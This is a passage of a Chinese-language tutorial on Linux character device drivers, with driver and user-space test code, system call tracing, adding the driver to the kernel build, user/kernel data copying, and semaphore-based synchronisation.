punctuation">,</span>fd<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span> <span class="token operator">==</span> fd<span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token function">perror</span><span class="token punctuation">(</span><span class="token string">"open file error\r\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token keyword">else</span> <span class="token punctuation">{</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"open successe\r\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span>        w_len <span class="token operator">=</span> <span class="token function">write</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span>buf<span class="token punctuation">,</span> DATA_NUM<span class="token punctuation">)</span><span class="token punctuation">;</span>    r_len <span class="token operator">=</span> <span class="token function">read</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> buf<span class="token punctuation">,</span> DATA_NUM<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d %d\r\n"</span><span class="token punctuation">,</span> w_len<span class="token punctuation">,</span> r_len<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%s\r\n"</span><span class="token punctuation">,</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>手动创建设备文件</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">mknod</span> /dev/hello c <span class="token number">232</span> <span class="token number">0</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/night-candle/figurebed/main/img/20211112-driver-test-succeeded.png" alt="执行测试程序"></p><p>执行dmesg查看驱动输出，发现驱动的hell_open, hello_write, hello_read被依次调用了</p><p><img src="https://raw.githubusercontent.com/night-candle/figurebed/main/img/20211112-test.png" alt=""></p></li></ol><h2 id="05-应用层write-怎样调用到驱动的write">05 应用层write()怎样调用到驱动的write()</h2><ol><li><p>对write函数，C库只会做一些检查，然后就陷入write的系统调用，系统调用会通过软中断的方式陷入到内核空间里去执行</p><p><img src="https://raw.githubusercontent.com/night-candle/figurebed/main/img/20211113-calling-process.png" alt="调用流程"></p></li><li><p>操作系统的系统调用是如何知道应该调用哪个驱动里的write函数？</p><ul><li><p>在hello驱动里，有定义主次设备号并组合成了devNum</p><p><code>cdev_init(gDev, gFile);</code>  建立了 gDev 和 gFile 的逻辑关系</p><p><code>cdev_add(gDev, devNum, 1);</code> 建立了 gDev 和 devNum 的逻辑关系</p></li><li><p>以上两句代码其实建立了gFile 和 devNum 的对应关系，也就是 file_operations 和主次设备号的对应关系</p></li><li><p>打开设备文件 /dev/hello 后就已经建立了这个文件和 hello 驱动里的 struct file 和 struct file_operations 的对应关系</p></li></ul></li><li><p>阅读内核 write 系统调用的实现部分</p><p>关键代码：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">if</span> <span class="token punctuation">(</span>file<span class="token operator">-&gt;</span>f_op<span class="token operator">-&gt;</span>write<span class="token punctuation">)</span> <span class="token keyword">return</span> file<span class="token operator">-&gt;</span>f_op<span class="token operator">-&gt;</span><span class="token function">write</span><span class="token punctuation">(</span>file<span class="token punctuation">,</span> p<span class="token punctuation">,</span> count<span class="token punctuation">,</span> pos<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>判断 hello 驱动里有没有定义 write 函数，如果有，那就调用</p><p>所以按照如上的路径，应用程序里的 write 就顺利的调用到了 hello 驱动里的 write 函数</p><blockquote><p>注意：在 linux 里，在应用层用文件句柄也就是fd表示一个打开的文件，但是在内核里用 <code>struct file</code> 表示一个打开的文件，用 <code>struct file_operations</code> 表示对该文件的操作，他们之间是一一对应的</p><p><img src="https://raw.githubusercontent.com/night-candle/figurebed/main/img/20211113-write-function-call.png" alt="fs/read_write.c"></p></blockquote></li></ol><h2 id="06-字符设备驱动代码添加到内核源码树">06 字符设备驱动代码添加到内核源码树</h2><ol><li><p>拷贝源码到字符设备文件夹中</p><p><img src="https://raw.githubusercontent.com/night-candle/figurebed/main/img/20211117-move.png" alt=""></p></li><li><p>添加Makefile</p><pre class="line-numbers language-makefile" data-language="makefile"><code class="language-makefile">obj-<span class="token variable">$</span><span class="token punctuation">(</span>CONFIG_HELLO<span class="token punctuation">)</span> <span class="token operator">+=</span> helloDev.o<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>将驱动添加到内核源码树中，修改 Kconfig 文件</p><pre class="line-numbers language-none"><code class="language-none">config HELLO     tristate "hello device"     default y     help       hello device<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>查看配置</p><p><img src="https://raw.githubusercontent.com/night-candle/figurebed/main/img/20211117-add-success.png" alt=""></p></li><li><p>重新编译内核（驱动编译到内核中，静态加载）</p><p><img src="https://raw.githubusercontent.com/night-candle/figurebed/main/img/20211117-recompiling-kernel.png" alt=""></p></li></ol><h2 id="07-内核空间和用户空间数据拷贝">07 内核空间和用户空间数据拷贝</h2><ol><li><p>内核空间和用户空间</p></li><li><p>驱动代码</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;linux/module.h&gt;</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;linux/moduleparam.h&gt;</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;linux/cdev.h&gt;</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;linux/fs.h&gt;</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;linux/wait.h&gt;</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;linux/poll.h&gt;</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;linux/sched.h&gt;</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;linux/slab.h&gt;</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token expression"><span class="token function">BUFFER_MAX</span>    <span class="token punctuation">(</span><span class="token number">64</span><span class="token punctuation">)</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token expression"><span class="token function">OK</span>            <span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token expression"><span class="token function">ERROR</span>         <span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span></span></span><span class="token keyword">struct</span> <span class="token class-name">cdev</span> <span class="token operator">*</span>gDev<span class="token punctuation">;</span><span class="token keyword">struct</span> <span class="token class-name">file_operations</span> <span class="token operator">*</span>gFile<span class="token punctuation">;</span>dev_t  devNum<span class="token punctuation">;</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span> subDevNum <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token keyword">int</span> reg_major  <span class="token operator">=</span>  <span class="token number">232</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> reg_minor <span class="token operator">=</span>   <span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">char</span> buffer<span class="token punctuation">[</span>BUFFER_MAX<span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">//在内核空间中</span><span class="token keyword">int</span> <span class="token function">hello_open</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">inode</span> <span class="token operator">*</span>p<span class="token punctuation">,</span> <span class="token keyword">struct</span> <span class="token class-name">file</span> <span class="token operator">*</span>f<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">printk</span><span class="token punctuation">(</span>KERN_INFO <span class="token string">"hello_open\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment">// u是用户空间的一个地址</span>ssize_t <span class="token function">hello_write</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">file</span> <span class="token operator">*</span>f<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> __user <span class="token operator">*</span>u<span class="token punctuation">,</span> size_t s<span class="token punctuation">,</span> loff_t <span class="token operator">*</span>l<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token comment">// printk(KERN_INFO "hello_write\n");</span><span class="token keyword">int</span> writelen <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    writelen <span class="token operator">=</span> BUFFER_MAX<span class="token operator">&gt;</span>s <span class="token operator">?</span> s <span class="token operator">:</span> BUFFER_MAX<span class="token punctuation">;</span> <span class="token comment">//防止越界</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">copy_from_user</span><span class="token punctuation">(</span>buffer<span class="token punctuation">,</span> u<span class="token punctuation">,</span> writelen<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token comment">//copy_from_user实现数据拷贝</span><span class="token keyword">return</span> <span class="token operator">-</span>EFAULT<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">return</span> writelen<span class="token punctuation">;</span> <span class="token comment">//返回拷贝成功字节数</span><span class="token punctuation">}</span>ssize_t <span class="token function">hello_read</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">file</span> <span class="token operator">*</span>f<span class="token punctuation">,</span> <span class="token keyword">char</span> __user <span class="token operator">*</span>u<span class="token punctuation">,</span> size_t s<span class="token punctuation">,</span> loff_t <span class="token operator">*</span>l<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token comment">// printk(KERN_INFO "hello_read\n");</span>    <span class="token keyword">int</span> readlen<span class="token punctuation">;</span>    readlen <span class="token operator">=</span> BUFFER_MAX<span class="token operator">&gt;</span>s <span class="token operator">?</span> s <span class="token operator">:</span> BUFFER_MAX<span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">copy_to_user</span><span class="token punctuation">(</span>u<span class="token punctuation">,</span> buffer<span class="token punctuation">,</span> readlen<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token comment">//copy_to_user把内核空间的数据拷贝给用户空间</span>    <span class="token keyword">return</span> <span class="token operator">-</span>EFAULT<span class="token punctuation">;</span><span class="token punctuation">}</span>    <span class="token keyword">return</span> readlen<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">int</span> <span class="token function">hello_init</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    devNum <span class="token operator">=</span> <span class="token function">MKDEV</span><span class="token punctuation">(</span>reg_major<span class="token punctuation">,</span> reg_minor<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>OK <span class="token operator">==</span> <span class="token function">register_chrdev_region</span><span class="token punctuation">(</span>devNum<span class="token punctuation">,</span> subDevNum<span class="token punctuation">,</span> <span class="token string">"helloworld"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token function">printk</span><span class="token punctuation">(</span>KERN_INFO <span class="token string">"register_chrdev_region ok \n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token punctuation">}</span><span class="token keyword">else</span> <span class="token punctuation">{</span>    <span class="token function">printk</span><span class="token punctuation">(</span>KERN_INFO <span class="token string">"register_chrdev_region error n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> ERROR<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token function">printk</span><span class="token punctuation">(</span>KERN_INFO <span class="token string">" hello driver init \n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    gDev <span class="token operator">=</span> <span class="token function">kmalloc</span><span class="token punctuation">(</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">cdev</span><span class="token punctuation">)</span><span class="token punctuation">,</span> GFP_KERNEL<span class="token punctuation">)</span><span class="token punctuation">;</span>    gFile <span class="token operator">=</span> <span class="token function">kmalloc</span><span class="token punctuation">(</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">file_operations</span><span class="token punctuation">)</span><span class="token punctuation">,</span> GFP_KERNEL<span class="token punctuation">)</span><span class="token punctuation">;</span>    gFile<span class="token operator">-&gt;</span>open <span class="token operator">=</span> hello_open<span class="token punctuation">;</span>    gFile<span class="token operator">-&gt;</span>read <span class="token operator">=</span> hello_read<span class="token punctuation">;</span>    gFile<span class="token operator">-&gt;</span>write <span class="token operator">=</span> hello_write<span class="token punctuation">;</span>    gFile<span class="token operator">-&gt;</span>owner <span class="token operator">=</span> THIS_MODULE<span class="token punctuation">;</span>    <span class="token function">cdev_init</span><span class="token punctuation">(</span>gDev<span class="token punctuation">,</span> gFile<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">cdev_add</span><span class="token punctuation">(</span>gDev<span class="token punctuation">,</span> devNum<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">void</span> __exit <span class="token function">hello_exit</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">{</span> <span class="token function">printk</span><span class="token punctuation">(</span>KERN_INFO <span class="token string">" hello driver exit \n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">cdev_del</span><span class="token punctuation">(</span>gDev<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">kfree</span><span class="token punctuation">(</span>gFile<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">kfree</span><span class="token punctuation">(</span>gDev<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">unregister_chrdev_region</span><span class="token punctuation">(</span>devNum<span class="token punctuation">,</span> subDevNum<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token function">module_init</span><span class="token punctuation">(</span>hello_init<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">module_exit</span><span class="token punctuation">(</span>hello_exit<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">MODULE_LICENSE</span><span class="token punctuation">(</span><span class="token string">"GPL"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>Makefile同上</p></li><li><p>测试代码</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;fcntl.h&gt;</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h&gt;</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h&gt;</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/select.h&gt;</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h&gt;</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token expression"><span class="token function">DATA_NUM</span>    <span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span></span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span>argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">int</span> fd<span class="token punctuation">,</span> i<span class="token punctuation">;</span>    <span class="token keyword">int</span> r_len<span class="token punctuation">,</span> w_len<span class="token punctuation">;</span>    fd_set fdset<span class="token punctuation">;</span>    <span class="token keyword">char</span> buf<span class="token punctuation">[</span>DATA_NUM<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"hello world"</span><span class="token punctuation">;</span>    fd <span class="token operator">=</span> <span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"/dev/hello"</span><span class="token punctuation">,</span> O_RDWR<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span> <span class="token operator">==</span> fd<span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token function">perror</span><span class="token punctuation">(</span><span class="token string">"open file error\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token keyword">else</span> <span class="token punctuation">{</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"open success\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span>    w_len <span class="token operator">=</span> <span class="token function">write</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> buf<span class="token punctuation">,</span> DATA_NUM<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>w_len <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token function">perror</span><span class="token punctuation">(</span><span class="token string">"write error\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">}</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"write len: %d\n"</span><span class="token punctuation">,</span> w_len<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">close</span><span class="token punctuation">(</span>fd<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;fcntl.h&gt;</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h&gt;</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h&gt;</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/select.h&gt;</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token expression"><span class="token function">DATA_NUM</span>    <span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span></span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span>argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">int</span> fd<span class="token punctuation">,</span> i<span class="token punctuation">;</span>    <span class="token keyword">int</span> r_len<span class="token punctuation">,</span> w_len<span class="token punctuation">;</span>    fd_set fdset<span class="token punctuation">;</span>    <span class="token keyword">char</span> rbuf<span class="token punctuation">[</span>DATA_NUM<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token function">memset</span><span class="token punctuation">(</span>rbuf<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>DATA_NUM<span class="token punctuation">)</span><span class="token punctuation">;</span>    fd <span class="token operator">=</span> <span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"/dev/hello"</span><span class="token punctuation">,</span> O_RDWR<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span> <span class="token operator">==</span> fd<span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token function">perror</span><span class="token punctuation">(</span><span class="token string">"open file error\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token keyword">else</span> <span class="token punctuation">{</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"open successe\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span>    r_len <span class="token operator">=</span> <span class="token function">read</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> rbuf<span class="token punctuation">,</span> DATA_NUM<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span>r_len <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token function">perror</span><span class="token punctuation">(</span><span class="token string">"read error\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">}</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"read len: %d\n"</span><span class="token punctuation">,</span> r_len<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%s\n"</span><span class="token punctuation">,</span> rbuf<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">close</span><span class="token punctuation">(</span>fd<span class="token punctuation">)</span><span class="token punctuation">;</span>c    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/night-candle/figurebed/main/img/20211119-test.png" alt=""></p></li></ol><h2 id="08-Linux内核同步">08 Linux内核同步</h2><h3 id="场景及解决">场景及解决</h3><ol><li><p>场景</p><p>在驱动程序中，有些设备只允许打开一次</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> xxx_count <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token comment">//驱动中的全局变量，表示打开的标志</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token keyword">int</span> <span class="token function">hello_open</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">inode</span> <span class="token operator">*</span>p<span class="token punctuation">,</span> <span class="token keyword">struct</span> <span class="token class-name">file</span> <span class="token operator">*</span>f<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>xxx_count<span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token operator">-</span>EBUSY<span class="token punctuation">;</span> <span class="token comment">//打开失败</span>    <span class="token punctuation">}</span>    <span class="token operator">++</span> xxx_count<span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token comment">//打开成功</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>假如一个进程 A 先对此设备调用 open ,另一个进程 B 也对此设备调用open，若调度如下，进程 A B 都会打开成功</p><img src="https://raw.githubusercontent.com/night-candle/figurebed/main/img/20211128-sample.png" style="zoom:67%;"></li><li><p>xxx_count 是一个共享资源，并发执行的单元对共享资源的同时访问会引发静态问题，解决竞态问题的途径是保证对共享资源的<strong>互斥访问</strong></p><p>访问共享资源的代码区块叫做临界区，临界区需要用某种<strong>内核同步方法</strong>来保护</p></li></ol><h3 id="Linux内核同步机制：semaphore">Linux内核同步机制：semaphore</h3><ol><li><p>使用</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">struct</span> <span class="token class-name">semaphore</span> sema<span class="token punctuation">;</span> <span class="token comment">//信号量</span><span class="token keyword">int</span> open_count <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token keyword">int</span> <span class="token function">hello_open</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">inode</span> <span class="token operator">*</span>p<span class="token punctuation">,</span> <span class="token keyword">struct</span> <span class="token class-name">file</span> <span class="token operator">*</span>f<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">down</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>sema<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//上锁</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>open_count <span class="token operator">&gt;=</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token function">up</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>sema<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">printk</span><span class="token punctuation">(</span>KERN_INFO <span class="token string">"dev is busy, hello_open fail\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token operator">-</span>EBUSY<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    open_count<span class="token operator">++</span><span class="token punctuation">;</span>    <span class="token function">up</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>sema<span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token function">printk</span><span class="token punctuation">(</span>KERN_INFO <span class="token string">"hello_open\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">int</span> <span class="token function">hello_close</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">inode</span> <span class="token operator">*</span>inode<span class="token punctuation">,</span><span class="token keyword">struct</span> <span class="token class-name">file</span> <span class="token operator">*</span>flip<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>open_count <span class="token operator">!=</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token function">printk</span><span class="token punctuation">(</span>KERN_INFO <span class="token string">"hello_close fail\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token operator">-</span>EBUSY<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    open_count<span class="token operator">--</span><span class="token punctuation">;</span>    <span class="token function">printk</span><span class="token punctuation">(</span>KERN_INFO <span class="token string">"hello_close ok\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token keyword">int</span> <span class="token function">hello_init</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>    <span class="token function">sema_init</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>sema<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//初始化</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" 